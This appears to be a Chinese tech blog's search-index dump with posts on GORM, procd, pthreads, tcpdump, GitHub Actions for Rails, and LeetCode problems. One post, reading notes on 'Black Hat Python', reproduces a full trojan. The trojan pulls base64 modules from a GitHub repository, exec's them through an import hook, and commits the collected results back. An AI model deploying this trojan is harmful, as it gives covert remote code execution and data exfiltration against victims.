int&#125;\nPreload會在產生user的實體時去查詢Company，把有關的公司填入Company的array\n所以會得到Company不是空的user\n關於Preload，如果是一對一或belong to就可以用Joins來填資料，這樣生出的sql只有一條，\n用Preload會針對需要的table各生一條，像User會生出兩條，一條查company，一條查User\nAssociation與Related都可以只把Company的array單獨抓出來\n這兩個差在哪裡?\nAssociation透過reference給的名字去找，也就是從外鍵值的來源去找，換言之從has關係的table為起點去找\nRelated透過foreignkey去找，也就是從外鍵去找，換言之從belong關係的table為起點去找\ndb.Model(&amp;user).Related(&amp;languages)db.Model(&amp;user).Association(&quot;Languages&quot;).Find(&amp;languages)db.Preload(&quot;Languages&quot;).Find(&amp;user)// 如果只有一個語言db.Joins(&quot;Languages&quot;).Find(&amp;user)// Preload只會載入一層，還有可以設條件db.Preload(&quot;Orders&quot;, &quot;state = ?&quot;, &quot;paid&quot;).Preload(&quot;Orders.OrderItems.Product&quot;).Preload(&quot;CreditCard&quot;).Find(&amp;users)\nRef\nvanilla sql\ngo sql interface\ngorm docu(說老實的，不好懂)\nRelated與Association1\nRelated與Association2(AssociationForeignKey就是這裡的references)\n自訂型別\nvaluer與scanner\n","categories":["Golang","Tips"]},{"title":"procd-turoial","url":"/2020/9/procd-turoial/","content":"動機\n有用到就記著\n\nprocd script\n#!/bin/sh /etc/rc.common# 決定執行服務的順序START=90 # /etc/rc.d/S90#&#123;SERVICE&#125; =&gt; /etc/rc.d/S90appSTOP=90 # /etc/rc.d/K90#&#123;SERVICE&#125; =&gt; /etc/rc.d/K90appSERVICE=appEXTRA_COMMANDS=&quot;custom&quot;EXTRA_HELP=&quot;        custom  Help for the custom command&quot; USE_PROCD=1custom() &#123;        echo &quot;custom command&quot;        # do your custom stuff&#125;start_service() &#123;\tprocd_open_instance\tprocd_set_param command /usr/sbin/app\tprocd_append_param command -bar 42 # append command parameters\t# respawn automatically if something died, be careful if you have an alternative process supervisor\t# if process dies sooner than respawn_threshold, it is considered crashed and after 5 retries the service is stopped\tprocd_set_param respawn $&#123;respawn_threshold:-3600&#125; $&#123;respawn_timeout:-5&#125; $&#123;respawn_retry:-5&#125;\tprocd_set_param env SOME_VARIABLE=funtimes  # pass environment variables to your process\tprocd_set_param limits core=&quot;unlimited&quot;  # If you need to set ulimit for your process\tprocd_set_param file /var/etc/your_service.conf # /etc/init.d/your_service reload will restart the daemon if these files have changed\tprocd_set_param netdev dev # likewise, except if dev&#x27;s ifindex changes.\tprocd_set_param data name=value ... # likewise, except if this data changes.\tprocd_set_param stdout 1 # forward stdout of the command to logd\tprocd_set_param stderr 1 # same for stderr\tprocd_set_param user nobody # run service as user nobody\tprocd_set_param pidfile /var/run/somefile.pid # write a pid file on instance start and remote it on stop\tprocd_close_instance&#125;service_triggers()&#123;    procd_add_reload_trigger &quot;config_file_name&quot; # 當/etc/config/config_file_name 的MD5變的時候，就會reload    procd_add_reload_trigger &quot;uci-file-name&quot; &quot;second-uci-file&quot;    procd_add_network_trigger &quot;lan&quot;|&quot;etho0&quot;&#125;reload_service() &#123;\t# when /etc/init.d/service restart invokes, this callback will be triggered\tprocd_send_signal service_name [instance_name] [signal]&#125;stop_service() &#123;\t# when /etc/init.d/service stop invokes, this callback will be triggered&#125;\nprocd basic command\n\nstart   Start the service\nstop    Stop the service\nrestart Restart the service\nreload  Reload configuration files (or restart if that fails)\nenable  Enable service autostart\ndisable Disable service autostart\n\nRef\noffical doc\nprocd tutorial1\nprocd tutorial2\n","categories":["System","Linux","Tips"]},{"title":"奇聞軼事 - condition variable","url":"/2020/9/pthread-cond-var/","content":"動機\n現在 main thread 生出 兩條thread\n然後 main thread 要等兩條thread完成\n然而有一定機率，兩條子thread的其中一條會整個停住\n只有一條可以完成\n\nhow to cancel the freezed thread?\n第一個方法是\n在某個子thread完成時就去cancel另一條\n這個方法只要能detach就能實現，但是detach因為不明原因，\n被detach的thread會自己消失，跑不到最後，進而無法成功完成\n這裡有detach出事的可能原因\n第二個方法是\n讓main thread等，直到一個子thread完成，就通知mainthraed去cancel另一條\n這裡用condition variable就能讓main thread等，所以有以下的code\nvoid child()&#123;\tdoing_something_may_consume_many_time_or_finish_immediately();\tclean_up();\tpthread_cond_notifiy(&amp;cond) // assume we have a cond var from main thread\tpthread_mutex_unlock(&amp;lock) // assume we have a mutex from main thread&#125;void main()&#123;\tpthread_mutex_lock(&amp;lock);\tpthread_create(child);\tpthread_create(child);\tpthread_cond_wait(&amp;cond,&amp;lock);\t// cancel freezed thread, and clean up&#125;\n最初用的時候，不知道為什麼需要mutex\n反正不是會被通知嗎? 為什麼需要mutex?\nmain thread waits forever (Lost Wakeup)\n之後悲劇就發生了，兩條子thread都沒了，但是main thread卻在cond的wait?!\n考慮到下面的case\n在main thread到wait之前，兩條子thread就完成了\n好吧，所以要確保在notify的時候，要有人wait\nbut how??\n所以我們需要mutex，直到碰到wait之前子thread都不能notify\nvoid child()&#123;\tdoing_something_may_consume_many_time_or_finish_immediately();\tpthread_mutex_lock(&amp;lock);\tif (another_thread_is_not_complete()) &#123;\t\tclean_up();\t\tpthread_cond_notifiy(&amp;cond) // assume we have a cond var from main thread\t&#125;\tpthread_mutex_unlock(&amp;lock) // assume we have a mutex from main thread&#125;void main()&#123;\tpthread_mutex_lock(&amp;lock);\tpthread_create(child);\tpthread_create(child);\tpthread_cond_wait(&amp;cond,&amp;lock);\t// cancel freezed thread, and clean up&#125;\nSpurious Wakeup\ncondition variable其實有的時候會被notify，但是沒有任何thread做notify!?\npthread的說法是完全精確的notify無法在所有平台上，完美的有效率的實作出來\n所以會有虛假甦醒(Spurious Wakeup)的問題，但是pthread也不會把這個當成bug\n所以要確保離開wait時，是我們期待的狀態\nvoid child()&#123;\tdoing_something_may_consume_many_time_or_finish_immediately();\tpthread_mutex_lock(&amp;lock);\tif (another_thread_is_not_complete()) &#123;\t\tclean_up();\t\tpthread_cond_notifiy(&amp;cond) // assume we have a cond var from main thread\t&#125; else &#123;\t\t// if another is complete, this child need not to do anything\t\t// another thread should have done all clean up \t&#125;\tpthread_mutex_unlock(&amp;lock) // assume we have a mutex from main thread&#125;void main()&#123;\tpthread_mutex_lock(&amp;lock);\tpthread_create(child);\tpthread_create(child);\twhile (both_child_threads_are_not_complete())\t\tpthread_cond_wait(&amp;cond,&amp;lock);\t// cancel freezed thread, and clean up&#125;\nreflection\n最初沒加lock在子thread中是因為\n\n不知道為什麼需要mutex\n要加在哪\n\n如果加在child的開頭會擋到另一條child跑\ndoing_something_may_consume_many_time_or_finish_immediately()\n如果開兩個cond var放在child的開頭，就變成有兩個wait，\n如果一條freeze，就不用動了\n到後面才想到，加在clean_up之前\n從有新的thread出生開始，整個程式的執行就變成thread的code混合完成出生之後的code\n而有mutex包起來的話，就可以當成在同一個function中執行，不論是不是在同一個thread\n所以在concurrent programming中，要怎麼決定要不要包mutex?(包的目的有?)\n\n在thread中的動作有沒有相依於另一個thread\n共用同一資源\n\n一般用mutex都是用在多thread共用同一資源，但這個case是為了確保happen-before\nRef\n就是這篇救了我\n","categories":["System","Parallel"]},{"title":"blackhat python - github & automation","url":"/2020/9/python-black-hat-gh/","content":"動機\n自動從github拉code下來跑!?\n有趣!!\n \nCH7\n  import jsonimport base64import sysimport timeimport typesimport randomimport threadingimport queuefrom github3 import logintrojan_id = &quot;abc&quot;trojan_config = &quot;config/&#123;&#125;.json&quot;.format(trojan_id)data_path = &quot;data/&#123;&#125;/&quot;.format(trojan_id)trojan_modules = []configured = Falsetask_queue = queue.Queue()class GitImporter(object):    def __init__(self):        self.current_module_code = &quot;&quot;    def find_module(self, fullname, path=None):        if configured:            print(&quot;[*] Attempting to retrieve %s&quot; % fullname)            new_library = get_file_contents(&quot;modules/%s&quot; % fullname)            if new_library:                self.current_module_code = base64.b64decode(new_library)                return self        return None    def load_module(self, name):        module = types.ModuleType(name)        exec(self.current_module_code, module.__dict__)        sys.modules[name] = module        return moduledef connect_to_github():    &quot;&quot;&quot; You can replace the password in the call to login() below for an    access token generated by GitHub if your account uses 2FA for access    (as it should). Easy-to-follow instructions on how to generate this    token can be found here:    https://help.github.com/en/github/authenticating-to-github/    creating-a-personal-access-token-for-the-command-line    If you choose to use the token, simply replace the &#x27;password&#x27;    attribute for &#x27;token&#x27; below and paste the token generated by    GitHub as a value instead of &#x27;YourPassword&#x27;. The code should be:    gh = login(username=&quot;YourUsername&quot;, token=&quot;YourToken&quot;)    &quot;&quot;&quot;    gh = login(username=&quot;YourUsername&quot;, password=&quot;YourPassword&quot;)    repo = gh.repository(&quot;YourUsername&quot;, &quot;RepositoryName&quot;)    branch = repo.branch(&quot;master&quot;)    return gh, repo, branchdef get_file_contents(filepath): # read    gh, repo, branch = connect_to_github()    tree = branch.commit.commit.tree.to_tree().recurse()    for filename in tree.tree:        if filepath in filename.path:            print(&quot;[*] Found file %s&quot; % filepath)            blob = repo.blob(filename._json_data[&#x27;sha&#x27;])            return blob.content    return Nonedef get_trojan_config():    global configured    config_json = get_file_contents(trojan_config)    configuration = json.loads(base64.b64decode(config_json))    configured = True    for tasks in configuration:        if tasks[&#x27;module&#x27;] not in sys.modules:            exec(&quot;import %s&quot; % tasks[&#x27;module&#x27;])    return configurationdef store_module_result(data): # write    gh, repo, branch = connect_to_github()    remote_path = &quot;data/%s/%d.data&quot; % (trojan_id, random.randint(1000, 100000))    repo.create_file(remote_path, &quot;Commit message&quot;, data.encode())    returndef module_runner(module):    task_queue.put(1)    result = sys.modules[module].run()    task_queue.get()    # store the result in our repo    store_module_result(result)    return# main trojan loop    sys.meta_path = [GitImporter()]while True:    if task_queue.empty():        config = get_trojan_config()        for task in config:            t = threading.Thread(target=module_runner, args=(task[&#x27;module&#x27;],))            t.start()            time.sleep(random.randint(1, 10))    time.sleep(random.randint(1000, 10000))\n兩個重點\n\n新的import，從github上拉檔案下來\n與github互動\n\n流程是\n\n從github拉config，去載入module\n從github拉module，跑他的code\n\n","categories":["Python","Reading"]},{"title":"範例程式與最佳實踐","url":"/2020/9/sample-code-best-practice/","content":"動機\n對之前處理pthread_cond的反省\n\n心得\n\n\n先google範例程式與最佳實踐，確認用法與陷阱\n\n\n確認所有參數在這個api中的意義(pthread_cond的mutex)\n\n\ncode review也是有極限的，不是說有review過就可以過，這是要看大家的閱歷量\n\n\n一個人的閱歷量決定了他能力的上限，一個人的實際經驗決定了他能力的下限\n共勉之!!\n","categories":["Etc"]},{"title":"tcpdunp條件式語法整理","url":"/2020/9/tcpdunp-cond/","content":"動機\n很常用，整理一下\n\n條件式語法(大概整理一下)\n與網路有關的部分\n\n[not]\nprotocol\na. ether, fddi, ip, ip6, ppp, radio, rarp, slip, tcp, udp, wlan\nattr\na. [src | dst] [port | portrange | port range | net | host] (要自己接到對應的proto，像ip src port就不對)\nb. broadcast | multicast  (只有ip, ether有用)\nvalues (8080, 22-25, 1.2.3.4, 1.2.3.0/24)\n\n組成: 1 2 3 4\n\n與封包大小有關的部分\n\n[not]\nless | greater | &lt;= | &gt;= | &lt; | &gt; |\nvalues (123, 456 …)\n\n組成: 1 2 3\n\n邏輯\nand(&amp;&amp;) , or(||) , not(!)\n\n取某個byte\n就是python的list\n{protocol}[nthBytes]\n{protocol}[a:len] : 從arr[a]取len個\n\n位元運算 與 比較\n位元運算: &amp;, |, &gt;&gt; , &lt;&lt;\n比較: =, !=\n例子:\n\n'tcp[13] &amp; 4 = 1' 或 'tcp[13] &amp; 4!=0' 或 'tcp[tcpflags] == tcp-rst'\n'tcp[(tcp[12]&gt;&gt;2):4] = 0x5353482D'\n\n好用的命令列參數\n\n-s : Define the snaplength (size) of the capture in bytes. Use -s0 to get everything, unless you are intentionally capturing less.\n-A : Print each packet (minus its link level header) in ASCII.  Handy for capturing web pages.\n-X : Show the packet’s contents in both hex and ASCII.\n-D : Show the list of available interfaces\n-l : Line-readable output (for viewing as you save, or sending to other commands)\n-q : Be less verbose (more quiet) with your output.\n-t : Give human-readable timestamp output.\n-i eth0 : Listen on the eth0 interface.\n-vv : Verbose output (more v’s gives more output).\n-c : Only get x number of packets and then stop.\n-S : Print absolute sequence numbers.\n-e : Get the ethernet header as well.\n-q : Show less protocol information.\n-E : Decrypt IPSEC traffic by providing an encryption key.\n\nRef\nA tcpdump Tutorial with Examples — 50 Ways to Isolate Traffic\ntcpdump Cheat Sheet\nwireshark-filter (注意wireshark的filter能做的比tcpdump多，會多一些語法)\n","categories":["Network","Tips"]},{"title":"github actions上跑rails的rspec","url":"/2021/01/github-actions-with-rails/","content":"動機\n在github actions上跑rspec的心得\n\ngithub actions\n本身是一台VM，所以service都是要用localhost去指，如果用container去setup就可以像用docker那樣用service name\n接著說說遇到的坑\nbundler cache\n如果用actions/setup-ruby，每次bundle install都要重抓\n用ruby/setup-ruby，就能用cache，但如果在這裡失敗，記得把Gemfile.lock刪了，再跑一次\n還有是因為是cache，所以要用bundle exec ...去跑指令，才會確保都是用bundler安裝的gem去跑\n- name: Set up Ruby  uses: ruby/setup-ruby@v1  with:    ruby-version: 2.7.2    bundler-cache: true\ndb host\n原本的環境不是用container所以要指定host成localhost，但是mysql會把lcoalhost當成主機名，所以要用127.0.0.1\ndatabase.yml.actions\ntest:  adapter: mysql2  username: root  password: mypw  pool: &lt;%= ENV.fetch(&quot;RAILS_MAX_THREADS&quot;) &#123; 5 &#125; %&gt;  database: mydb_test  host: 127.0.0.1 #only for github action\nmysql service\n就我找到的範例，都是以PostgreSQL為主，所以特別寫一下，寫起來就是mysql的dockerfile\n這次剛好處理之前docker-compose遇到的db還沒啟動，但app卻啟動的問題\nservices:    db:      image: mariadb      env:        MYSQL_ROOT_PASSWORD: $&#123;&#123; secrets.DB_PASSWORD &#125;&#125;        MYSQL_DATABASE: mydb_test      ports: [&quot;3306:3306&quot;]      options: &gt;-        --health-cmd &quot;mysqladmin ping&quot;        --health-interval 10s        --health-timeout 5s        --health-retries 5\n放在一起\n整個放在一起\nname: Railson: pushjobs:  verify:    name: Build    runs-on: ubuntu-latest    services:        db:          image: mariadb          env:            MYSQL_ROOT_PASSWORD: $&#123;&#123; secrets.DB_PASSWORD &#125;&#125;            MYSQL_DATABASE: mydb_test          ports: [&quot;3306:3306&quot;]          options: &gt;-            --health-cmd &quot;mysqladmin ping&quot;            --health-interval 10s            --health-timeout 5s            --health-retries 5    steps:      - name: Install dependencies        run: |          sudo apt-get -yqq install libmariadbclient-dev      - uses: actions/checkout@v2      - name: Set up Ruby        uses: ruby/setup-ruby@v1        with:          ruby-version: 2.7.2          bundler-cache: true      - name: bundle install        run: bundle install --jobs 4 --retry 3      - name: generate secret        run: |          sed -i &quot;s/REPLACE_WITH_SECRET/&#x27;$(bundle exec rake secret)&#x27;/g&quot; config/initializers/devise.rb      - name: Setup test database &amp; Run tests        env:          RAILS_ENV: test        run: |          cp config/database.yml.actions config/database.yml          bundle exec rake db:drop db:create db:migrate      - name: Run tests        env:          RAILS_ENV: test        run: bundle exec rspec\nsecret &amp; credential\n這次處理最久的是secret的問題，devise-jwt需要secret，原本是放\nRails.application.credentials[:jwt-secret]\n在本機上跑得好好的，但換到github actions就炸了，token一直失效\n之後查資料才看到credential是用master.key加密的yaml，但是commit到github時不會commit master.key，但是加密過的yaml卻被commit!!??\n所以我commit一個沒辦法用的yaml到github上去??!!\n最後就是統一在產生image時產生secret直接寫進去\nRUN sed -i &#x27;s/REPLACE_WITH_SECRET/$(bundle exec rake secret)&#x27; config/initializers/devise.rb\n其他心得\n主要是修正從sqlite換到mysql所導致rspec原本過的test失敗的事情\n在測試時不要假設id的數字\n原本在sqlite跑\ndescribe &quot;GET /show&quot; do    before &#123; get &quot;/books/#&#123;book_id&#125;&quot; &#125;    context &quot;vaild book_id&quot; do      let(:book_id) &#123; books.first.id &#125;      it &quot;return book data&#x27;&quot; do        expect(response).to be_successful        expect(json[&quot;data&quot;][&quot;id&quot;]).to eq(books.size)      end    endend\n會過 (假設id等於資料總數量，因為有用database cleaner)\n但是換到mysql後，數量是對的但是id卻不是從頭開始記數\n所以要與長度脫勾\ndescribe &quot;GET /show&quot; do    before &#123; get &quot;/books/#&#123;book_id&#125;&quot; &#125;    context &quot;vaild book_id&quot; do      let(:book_id) &#123; books.first.id &#125;      it &quot;return book data&#x27;&quot; do        expect(response).to be_successful        expect(json[&quot;data&quot;][&quot;id&quot;]).to eq(book_id) # &lt;=      end    endend\n不同DB的datetime有不同output\n存到mysql的datetime與拿出來的在時間上有差異\nit &quot;set due date&quot; do\tnow = DateTime.now\tallow(subject).to receive(:set_due_date) &#123; subject.due_date = now &#125;\tsubject.approve\texpect(subject.due_date).to eq(now)end\n這邊的workaround是比日期\nit &quot;set due date&quot; do\tnow = DateTime.now.utc\tallow(subject).to receive(:set_due_date) &#123; subject.due_date = now &#125;\tsubject.approve\texpect(subject.due_date.to_date).to eq(now.to_date)end\n用unit test去debug\n原本跑完發現錯，就一直對user以外的元件debug，因為test跑完，最先看到的不是來自user的錯，是其他model的錯，因為它放最後，所以最先去看她發生什麼事\n結果到後面才想起來，他們不是都相依於user嗎，所以應該先看user吧\n這裡是誤以為error是獨立的，卻忘了原本model的相依性\n不過，測試也應該依據相依性先測有相依的model再測派生的model吧\n不然錯誤會傳染，不好找到根源\n","categories":["Rails","Tips"]},{"title":"leetcode-1011 - Capacity To Ship Packages Within D Days","url":"/2021/01/leetcode-1011/","content":"動機\n\nmethod call的代價會不會太高!?\n見到bsearch的範圍的重要性\n\n\nProblem\nA conveyor belt has packages that must be shipped from one port to another within days days.The ith package on the conveyor belt has a weight of weights[i]. Each day, we load the ship with packages on the conveyor belt (in the order given by weights). We may not load more weight than the maximum weight capacity of the ship.Return the least weight capacity of the ship that will result in all the packages on the conveyor belt being shipped within days days. Example 1:Input: weights = [1,2,3,4,5,6,7,8,9,10], days = 5Output: 15Explanation: A ship capacity of 15 is the minimum to ship all the packages in 5 days like this:1st day: 1, 2, 3, 4, 52nd day: 6, 73rd day: 84th day: 95th day: 10Note that the cargo must be shipped in the order given, so using a ship of capacity 14 and splitting the packages into parts like (2, 3, 4, 5), (1, 6, 7), (8), (9), (10) is not allowed.Example 2:Input: weights = [3,2,2,4,1,4], days = 3Output: 6Explanation: A ship capacity of 6 is the minimum to ship all the packages in 3 days like this:1st day: 3, 22nd day: 2, 43rd day: 1, 4Example 3:Input: weights = [1,2,3,1,1], days = 4Output: 3Explanation:1st day: 12nd day: 23rd day: 34th day: 1, 1 Constraints:1 ","categories":["Algorithm","Leetcode","60 questions to solve"],"tags":["Array","Binary Search","Greedy"]},{"title":"leetcode-121 - Best Time to Buy and Sell Stock","url":"/2021/01/leetcode-121/","content":"動機\n經典的stock系列題目的開始\n\nProblem\nYou are given an array prices where prices[i] is the price of a given stock on the ith day.You want to maximize your profit by choosing a single day to buy one stock and choosing a different day in the future to sell that stock.Return the maximum profit you can achieve from this transaction. If you cannot achieve any profit, return 0. Example 1:Input: prices = [7,1,5,3,6,4]Output: 5Explanation: Buy on day 2 (price = 1) and sell on day 5 (price = 6), profit = 6-1 = 5.Note that buying on day 2 and selling on day 1 is not allowed because you must buy before you sell.Example 2:Input: prices = [7,6,4,3,1]Output: 0Explanation: In this case, no transactions are done and the max profit = 0. Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Dynamic Programming","Array"]},{"title":"leetcode-123 - Best Time to Buy and Sell Stock III","url":"/2021/01/leetcode-123/","content":"動機\n用算k個的dp就可以解這題，但是想介紹當初沒有用dp的解法\n\nProblem\nYou are given an array prices where prices[i] is the price of a given stock on the ith day.Find the maximum profit you can achieve. You may complete at most two transactions.Note: You may not engage in multiple transactions simultaneously (i.e., you must sell the stock before you buy again). Example 1:Input: prices = [3,3,5,0,0,3,1,4]Output: 6Explanation: Buy on day 4 (price = 0) and sell on day 6 (price = 3), profit = 3-0 = 3.Then buy on day 7 (price = 1) and sell on day 8 (price = 4), profit = 4-1 = 3.Example 2:Input: prices = [1,2,3,4,5]Output: 4Explanation: Buy on day 1 (price = 1) and sell on day 5 (price = 5), profit = 5-1 = 4.Note that you cannot buy on day 1, buy on day 2 and sell them later, as you are engaging multiple transactions at the same time. You must sell before buying again.Example 3:Input: prices = [7,6,4,3,1]Output: 0Explanation: In this case, no transaction is done, i.e. max profit = 0.Example 4:Input: prices = [1]Output: 0 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array"]},{"title":"leetcode-1261 - Find Elements in a Contaminated Binary Tree","url":"/2021/01/leetcode-1261/","content":"動機\n這題讓我把binary編碼與complete binary tree的關係找回來了\n\nProblem\nGiven a binary tree with the following rules:root.val == 0If treeNode.val == x and treeNode.left != null, then treeNode.left.val == 2 * x + 1If treeNode.val == x and treeNode.right != null, then treeNode.right.val == 2 * x + 2Now the binary tree is contaminated, which means all treeNode.val have been changed to -1.Implement the FindElements class:FindElements(TreeNode* root) Initializes the object with a contaminated binary tree and recovers it.bool find(int target) Returns true if the target value exists in the recovered binary tree. Example 1:Input[FindElements,find,find][[[-1,null,-1]],[1],[2]]Output[null,false,true]ExplanationFindElements findElements = new FindElements([-1,null,-1]); findElements.find(1); // return False findElements.find(2); // return True Example 2:Input[FindElements,find,find,find][[[-1,-1,-1,-1,-1]],[1],[3],[5]]Output[null,true,true,false]ExplanationFindElements findElements = new FindElements([-1,-1,-1,-1,-1]);findElements.find(1); // return TruefindElements.find(3); // return TruefindElements.find(5); // return FalseExample 3:Input[FindElements,find,find,find,find][[[-1,null,-1,-1,null,-1]],[2],[3],[4],[5]]Output[null,true,false,false,true]ExplanationFindElements findElements = new FindElements([-1,null,-1,-1,null,-1]);findElements.find(2); // return TruefindElements.find(3); // return FalsefindElements.find(4); // return FalsefindElements.find(5); // return True Constraints:TreeNode.val == -1The height of the binary tree is less than or equal to 20The total number of nodes is between [1, 104]Total calls of find() is between [1, 104]0 ","categories":["Algorithm","Leetcode"],"tags":["Breadth-First Search","Depth-First Search","Design","Binary Tree","Tree"]},{"title":"leetcode-127 - Word Ladder","url":"/2021/01/leetcode-127/","content":"動機\n重點是怎麼找下一個!!\n讓每一次擴展狀態都是有用的，少做許多無用功\n\nProblem\nA transformation sequence from word beginWord to word endWord using a dictionary wordList is a sequence of words beginWord -> s1 -> s2 -> ... -> sk such that:Every adjacent pair of words differs by a single letter.Every si for 1  dot -> dog -> cog, which is 5 words long.Example 2:Input: beginWord = hit, endWord = cog, wordList = [hot,dot,dog,lot,log]Output: 0Explanation: The endWord cog is not in wordList, therefore there is no valid transformation sequence. Constraints:1 ","categories":["Algorithm","Leetcode","60 questions to solve","Top Interview Questions","CTCI-COMPLETE-LIST"],"tags":["String","Breadth-First Search","Hash Table"]},{"title":"leetcode-131 - Palindrome Partitioning","url":"/2021/01/leetcode-131/","content":"動機\n感覺回文的DP就是判斷是不是回文ㄟ\n\nProblem\nGiven a string s, partition s such that every substring of the partition is a palindrome. Return all possible palindrome partitioning of s.A palindrome string is a string that reads the same backward as forward. Example 1:Input: s = aabOutput: [[a,a,b],[aa,b]]Example 2:Input: s = aOutput: [[a]] Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions","seanprashad"],"tags":["Dynamic Programming","String","Backtracking"]},{"title":"leetcode-134 - Gas Station","url":"/2021/01/leetcode-134/","content":"動機\ngreedy都是一種特別的想法，從一個等式或不等式開始\n\nProblem\nThere are n gas stations along a circular route, where the amount of gas at the ith station is gas[i].You have a car with an unlimited gas tank and it costs cost[i] of gas to travel from the ith station to its next (i + 1)th station. You begin the journey with an empty tank at one of the gas stations.Given two integer arrays gas and cost, return the starting gas station's index if you can travel around the circuit once in the clockwise direction, otherwise return -1. If there exists a solution, it is guaranteed to be unique Example 1:Input: gas = [1,2,3,4,5], cost = [3,4,5,1,2]Output: 3Explanation:Start at station 3 (index 3) and fill up with 4 unit of gas. Your tank = 0 + 4 = 4Travel to station 4. Your tank = 4 - 1 + 5 = 8Travel to station 0. Your tank = 8 - 2 + 1 = 7Travel to station 1. Your tank = 7 - 3 + 2 = 6Travel to station 2. Your tank = 6 - 4 + 3 = 5Travel to station 3. The cost is 5. Your gas is just enough to travel back to station 3.Therefore, return 3 as the starting index.Example 2:Input: gas = [2,3,4], cost = [3,4,3]Output: -1Explanation:You can't start at station 0 or 1, as there is not enough gas to travel to the next station.Let's start at station 2 and fill up with 4 unit of gas. Your tank = 0 + 4 = 4Travel to station 0. Your tank = 4 - 3 + 2 = 3Travel to station 1. Your tank = 3 - 3 + 3 = 3You cannot travel back to station 2, as it requires 4 unit of gas but you only have 3.Therefore, you can't travel around the circuit once no matter where you start. Constraints:gas.length == ncost.length == n1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Array","Greedy"]},{"title":"leetcode-148 - Sort List","url":"/2021/01/leetcode-148/","content":"動機\nmerge sort的所有case都是O(nLog(n))!!\n\nProblem\nGiven the head of a linked list, return the list after sorting it in ascending order.Follow up: Can you sort the linked list in O(n logn) time and O(1) memory (i.e. constant space)? Example 1:Input: head = [4,2,1,3]Output: [1,2,3,4]Example 2:Input: head = [-1,5,3,4,0]Output: [-1,0,3,4,5]Example 3:Input: head = []Output: [] Constraints:The number of nodes in the list is in the range [0, 5 * 104].-105 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad"],"tags":["Two Pointers","Divide and Conquer","Linked List","Sorting","Merge Sort"]},{"title":"leetcode-149 - Max Points on a Line","url":"/2021/01/leetcode-149/","content":"動機\n同樣的點好可怕\n\nProblem\nGiven an array of points where points[i] = [xi, yi] represents a point on the X-Y plane, return the maximum number of points that lie on the same straight line. Example 1:Input: points = [[1,1],[2,2],[3,3]]Output: 3Example 2:Input: points = [[1,1],[3,2],[5,3],[4,1],[2,3],[1,4]]Output: 4 Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Math","Hash Table","Geometry"]},{"title":"leetcode-160 - Intersection of Two Linked Lists","url":"/2021/01/leetcode-160/","content":"動機\n不能動node內容!!\n\nProblem\nGiven the heads of two singly linked-lists headA and headB, return the node at which the two lists intersect. If the two linked lists have no intersection at all, return null.For example, the following two linked lists begin to intersect at node c1:The test cases are generated such that there are no cycles anywhere in the entire linked structure.Note that the linked lists must retain their original structure after the function returns.Custom Judge:The inputs to the judge are given as follows (your program is not given these inputs):intersectVal - The value of the node where the intersection occurs. This is 0 if there is no intersected node.listA - The first linked list.listB - The second linked list.skipA - The number of nodes to skip ahead in listA (starting from the head) to get to the intersected node.skipB - The number of nodes to skip ahead in listB (starting from the head) to get to the intersected node.The judge will then create the linked structure based on these inputs and pass the two heads, headA and headB to your program. If you correctly return the intersected node, then your solution will be accepted. Example 1:Input: intersectVal = 8, listA = [4,1,8,4,5], listB = [5,6,1,8,4,5], skipA = 2, skipB = 3Output: Intersected at '8'Explanation: The intersected node's value is 8 (note that this must not be 0 if the two lists intersect).From the head of A, it reads as [4,1,8,4,5]. From the head of B, it reads as [5,6,1,8,4,5]. There are 2 nodes before the intersected node in A; There are 3 nodes before the intersected node in B.Example 2:Input: intersectVal = 2, listA = [1,9,1,2,4], listB = [3,2,4], skipA = 3, skipB = 1Output: Intersected at '2'Explanation: The intersected node's value is 2 (note that this must not be 0 if the two lists intersect).From the head of A, it reads as [1,9,1,2,4]. From the head of B, it reads as [3,2,4]. There are 3 nodes before the intersected node in A; There are 1 node before the intersected node in B.Example 3:Input: intersectVal = 0, listA = [2,6,4], listB = [1,5], skipA = 3, skipB = 2Output: No intersectionExplanation: From the head of A, it reads as [2,6,4]. From the head of B, it reads as [1,5]. Since the two lists do not intersect, intersectVal must be 0, while skipA and skipB can be arbitrary values.Explanation: The two lists do not intersect, so return null. Constraints:The number of nodes of listA is in the m.The number of nodes of listB is in the n.0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","CTCI-COMPLETE-LIST"],"tags":["Two Pointers","Linked List","Hash Table"]},{"title":"leetcode-166 - Fraction to Recurring Decimal","url":"/2021/01/leetcode-166/","content":"動機\n數論不好，當初居然是用算出來的商去看有沒有重複\n\nProblem\nGiven two integers representing the numerator and denominator of a fraction, return the fraction in string format.If the fractional part is repeating, enclose the repeating part in parentheses.If multiple answers are possible, return any of them.It is guaranteed that the length of the answer string is less than 104 for all the given inputs. Example 1:Input: numerator = 1, denominator = 2Output: 0.5Example 2:Input: numerator = 2, denominator = 1Output: 2Example 3:Input: numerator = 2, denominator = 3Output: 0.(6)Example 4:Input: numerator = 4, denominator = 333Output: 0.(012)Example 5:Input: numerator = 1, denominator = 5Output: 0.2 Constraints:-231 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["String","Math","Hash Table"]},{"title":"leetcode-171 - Excel Sheet Column Number","url":"/2021/01/leetcode-171/","content":"動機\n高級的X進制\n\nProblem\nGiven a string columnTitle that represents the column title as appear in an Excel sheet, return its corresponding column number.For example:A -> 1B -> 2C -> 3...Z -> 26AA -> 27AB -> 28 ... Example 1:Input: columnTitle = AOutput: 1Example 2:Input: columnTitle = ABOutput: 28Example 3:Input: columnTitle = ZYOutput: 701Example 4:Input: columnTitle = FXSHRXWOutput: 2147483647 Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["String","Math"]},{"title":"leetcode-172 - Factorial Trailing Zeroes","url":"/2021/01/leetcode-172/","content":"動機\n這應該可以用5進位制來看，但要先把數論找回來\n\nProblem\nGiven an integer n, return the number of trailing zeroes in n!.Follow up: Could you write a solution that works in logarithmic time complexity? Example 1:Input: n = 3Output: 0Explanation: 3! = 6, no trailing zero.Example 2:Input: n = 5Output: 1Explanation: 5! = 120, one trailing zero.Example 3:Input: n = 0Output: 0 Constraints:0 ","categories":["Algorithm","Leetcode","Top Interview 